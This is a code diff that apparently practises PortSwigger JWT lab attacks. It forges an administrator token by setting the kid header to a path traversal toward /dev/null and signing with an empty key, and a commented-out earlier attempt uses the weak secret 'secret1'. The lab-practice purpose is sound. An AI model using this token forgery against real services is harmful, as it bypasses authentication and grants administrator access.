@@ -1,4 +1,5 @@
 import { decode, sign, verify } from "jsonwebtoken";
+import crypto from "crypto";
 
 const secretOrPrivateKey = "secretOrPrivateKey";
 const payload = "payload";
@@ -165,17 +166,33 @@ const audience = "yusheng-tech-blog.web.app";
 // //   jti: '3d6d0fb6-1624-4c3b-b32c-22f6e84e1119'
 // // }
 
-const token10 = sign(
-  { iss: "portswigger", exp: 1761482635, sub: "administrator" },
-  "secret1",
+// const token10 = sign(
+//   { iss: "portswigger", exp: 1761482635, sub: "administrator" },
+//   "secret1",
+//   {
+//     noTimestamp: true,
+//     keyid: "9c1bd791-418f-46d0-9a5d-e1af3f3da139",
+//     header: {
+//       alg: "HS256",
+//       typ: undefined,
+//     },
+//   },
+// );
+// console.log(token10);
+// console.log(decode(token10, { complete: true }));
+
+const token11 = sign(
+  { iss: "portswigger", exp: 1761565652, sub: "administrator" },
+  "",
   {
     noTimestamp: true,
-    keyid: "9c1bd791-418f-46d0-9a5d-e1af3f3da139",
+    keyid: "../../../../../../../../../../dev/null",
     header: {
       alg: "HS256",
       typ: undefined,
     },
   },
 );
-console.log(token10);
-console.log(decode(token10, { complete: true }));
+console.log(token11);
+const decodeResult = decode(token11, { complete: true });
+console.log(decodeResult);
